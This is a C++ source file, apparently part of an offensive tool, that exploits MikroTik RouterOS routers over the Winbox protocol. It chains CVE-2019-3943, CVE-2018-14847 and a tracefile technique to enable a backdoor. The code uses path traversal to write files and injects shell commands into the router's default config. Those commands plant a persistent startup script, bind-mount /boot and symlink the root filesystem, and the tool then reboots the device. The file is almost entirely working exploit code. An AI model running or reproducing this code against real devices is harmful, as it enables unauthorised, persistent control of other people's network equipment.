#include "sploit.hpp"

#include "winbox_message.hpp"

#include <iostream>

namespace
{

    /**
     * Calls sessions receive and checks for any errors that might be present.
     * 
     * \param[in,out] p_session the session we are operating over.
     * \param[in,out] p_msg the message the received data will be transftered to
     *
     * \return true if we received a message without errors. false otherwise.
     */
    bool do_recv(Session& p_session, WinboxMessage& p_msg)
    {
        p_msg.reset();
        if (!p_session.receive(p_msg))
        {
            std::cerr << "Error receiving a response." << std::endl;
            return false;
        }

        if (p_msg.has_error())
        {
            std::cerr << p_msg.get_error_string() << std::endl;
            return false;
        }

        return true;
    }  
}

Sploit::Sploit(Session& p_session, const std::string& p_username,
               const std::string& p_password, bool p_do_sym,
               bool p_do_persistence) :
    m_session(p_session),
    m_username(p_username),
    m_password(p_password),
    m_type(msg::backdoor_location::k_fail),
    m_location(),
    m_id(2),
    m_do_symlink(p_do_sym),
    m_do_persistence(p_do_persistence)
{
}

Sploit::~Sploit()
{
}

bool Sploit::pwn()
{
    std::string version;
    if (!get_version(version))
    {
        return false;
    }

    if (!get_backdoor_location(version))
    {
        return false;
    }

    msg::exploits selected_sploit = sploit_selection(version);
    if (selected_sploit == msg::k_none)
    {
        return false;
    }
    std::cout << "[+] You've selected " << msg::sploit_string(selected_sploit) 
              << ". What a fine choice!" << std::endl;

    bool exploit_result = false;
    switch (selected_sploit)
    {
        case msg::k_hackerfantastic_tracefile:
            exploit_result = do_hf_tracefile();
            break;
        case msg::k_cve_2019_3943:
            exploit_result = do_traversal_vulns(72, 1);
            break;
        case msg::k_cve_2018_14847:
            exploit_result = do_traversal_vulns(2, 2);
            break;
        default:
            std::cerr << "Why have you done this?" << std::endl;
            return false;
    }

    if (!exploit_result)
    {
        // not good
        return false;
    }

    msg::activation_message(m_type,  m_do_symlink, m_do_persistence);
    if (msg::reboot_message(m_type, m_do_symlink, m_do_persistence))
    {
        m_id++;
        WinboxMessage msg;
        msg::make_reboot(msg, m_id);
        if (!m_session.send(msg))
        {
            std::cerr << "[-] Failed to send the reboot" << std::endl;
            return false;
        }
        if (!do_recv(m_session, msg))
        {
            return false;
        }
    }
    msg::persistence_warning(m_type);
    return true;
}

bool Sploit::get_version(std::string& p_version)
{
    WinboxMessage msg;
    msg::make_version_request(msg, m_id);
    if (!m_session.send(msg))
    {
        std::cerr << "[-] Failed to send the version request." << std::endl;
        return false;
    }

    if (!do_recv(m_session, msg))
    {
        return false;
    }

    p_version.assign(msg.get_string(0x16));
    if (p_version.empty())
    {
        std::cerr << "[-] Version string was empty." << std::endl;
        return false;
    }

    std::cout << "[+] The device is running RouterOS " << p_version << std::endl;

    return true;
}

bool Sploit::get_backdoor_location(const std::string& p_version)
{
    m_type = msg::find_backdoor_location(p_version, m_location);
    if (m_type == msg::backdoor_location::k_fail)
    {
        return false;
    }

    std::cout << "[+] The backdoor location is " << m_location << std::endl;

    return true;
}

msg::exploits Sploit::sploit_selection(const std::string& p_version)
{
    std::vector<msg::exploits> sploits(msg::find_supported_exploits(p_version));
    if (sploits.empty())
    {
        std::cout << "[!] Oh no! We don't have a vulnerability that exploits this version!" << std::endl;
        return msg::k_none;
    }
    else if (sploits.size() == 1)
    {
        std::cout << "[+] We only support 1 vulnerability for this version " << std::endl;
        return sploits[0];
    }
    else
    {
        std::string response;
        std::cout << "[+] We support " << sploits.size() << " vulnerabilities for this version:" << std::endl;

        for (std::size_t i = 0; i < sploits.size(); i++)
        {
            std::cout << "\t" << i+1 << ". " << msg::sploit_string(sploits[i]) << std::endl; 
        }

        do
        {
            std::cout << "[?] Please select an vulnerability (1-" << sploits.size() << "): ";
            std::cin >> response;
        }
        while (!std::cin.fail() && (response.size() != 1 || !std::isdigit(response[0]) ||
                std::stoul(response) == 0 || std::stoul(response) > sploits.size()));

        if (std::cin.fail())
        {
            std::cout << "[-] Input error!" << std::endl;
            return msg::k_none;
        }

        return sploits[std::stoul(response) - 1];
    }

    return msg::k_none;
}

bool Sploit::do_traversal_vulns(boost::uint32_t p_to, boost::uint32_t p_sub_to)
{
    WinboxMessage msg;

    if (m_type == msg::k_nova || m_type == msg::k_flash || (m_type == msg::k_opt && !m_do_symlink && !m_do_persistence))
    {
        if (m_do_symlink)
        {
            std::cout << "[!] Dropping a symlink is not supported for this version." << std::endl;
        }

        m_id++;
        std::string traversal("//./.././.././.." + m_location);
        msg::make_open_write(msg, m_id, traversal, p_to, p_sub_to);
        if (!m_session.send(msg))
        {
            std::cerr << "[+] Failed to send the file create message." << std::endl;
            return false;
        }
        if (!do_recv(m_session, msg))
        {
            return false;
        }
    }
    else
    {
        m_id++;
        std::string traversal("//./.././.././../rw/DEFCONF");
        msg::make_open_write(msg, m_id, traversal, p_to, p_sub_to);
        if (!m_session.send(msg))
        {
            std::cerr << "[-] Failed to send the file create message." << std::endl;
            return false;
        }
        if (!do_recv(m_session, msg))
        {
            return false;
        }

        boost::uint32_t session_id = msg.get_u32(0xfe0001);
        if (session_id == 0)
        {
            std::cerr << "[-] Failed to extract the session id" << std::endl;
            return false;
        }

        m_id++;
        std::string conf_file("ok; ");
        if (m_do_persistence)
        {
            conf_file.append("cp /rw/DEFCONF /rw/.lol; mkdir -p /ram/pckg/lol/etc/rc.d/run.d/; echo -e '#!/bin/bash\\n\\ncp /rw/.lol /rw/DEFCONF\\n' > /ram/pckg/lol/etc/rc.d/run.d/K92lol; chmod 777 /ram/pckg/lol/etc/rc.d/run.d/K92lol; mkdir /pckg/option; mount -o bind /boot/ /pckg/option/");
        }
        else
        {
            conf_file.append("mkdir /pckg/option; mount -o bind /boot/ /pckg/option");
        }
        
        if (m_do_symlink)
        {
            conf_file.append("; ln -s / /rw/disk/.survival");
        }
        
        msg::make_write(msg, m_id, session_id, conf_file, p_to, p_sub_to);
        if (!m_session.send(msg))
        {
            std::cerr << "[+] Failed to send the file create message." << std::endl;
            return false;
        }
        if (!do_recv(m_session, msg))
        {
            return false;
        }
    }

    return true;
}

bool Sploit::do_hf_tracefile()
{
    if (m_do_symlink)
    {
        std::cout << "[!] Dropping a symlink is not supported for this exploit." << std::endl;
    }

    WinboxMessage msg;
    m_id++;
    msg::make_term_request(msg, m_id, m_username);
    if (!m_session.send(msg))
    {
        std::cerr << "[-] Failed to send the terminal request." << std::endl;
        return false;
    }
    if (!do_recv(m_session, msg))
    {
        return false;
    }

    boost::uint32_t session_id = msg.get_u32(0xfe0001);
    boost::uint32_t tracker = 0;

    m_id++;
    msg::make_init_term_tracker(msg, m_id, session_id);
    if (!m_session.send(msg))
    {
        std::cerr << "[-] Failed to the terminal byte tracker init request." << std::endl;
        return false;
    }
    if (!do_recv(m_session, msg))
    {
        return false;
    }

    if (!msg.get_raw(0x02).empty())
    {
        std::string raw_payload(msg.get_raw(0x02));
        tracker += raw_payload.size();
    }

    m_id++;
    msg::make_set_tracefile(msg, m_id, session_id, tracker, "set tracefile " + m_location + "\n");
    if (!m_session.send(msg))
    {
        std::cerr << "[-] Failed to send set tracefile message." << std::endl;
        return false;
    }

    std::cout << "[+] Looping until we get a telnet prompt. Good luck!" << std::endl;
    bool found_telnet_prompt = false;
    while (!found_telnet_prompt)
    {
        if (!do_recv(m_session, msg))
        {
            return false;
        }

        std::cout << "[+] ... " << std::endl;

        if (!msg.get_raw(0x02).empty())
        {
            std::string raw_payload(msg.get_raw(0x02));
            if (raw_payload.find("telnet> ") != std::string::npos)
            {
                std::cout << "[+] Got a telnet prompt!" << std::endl;
                found_telnet_prompt = true;
            }
        }
    }
    return true;
}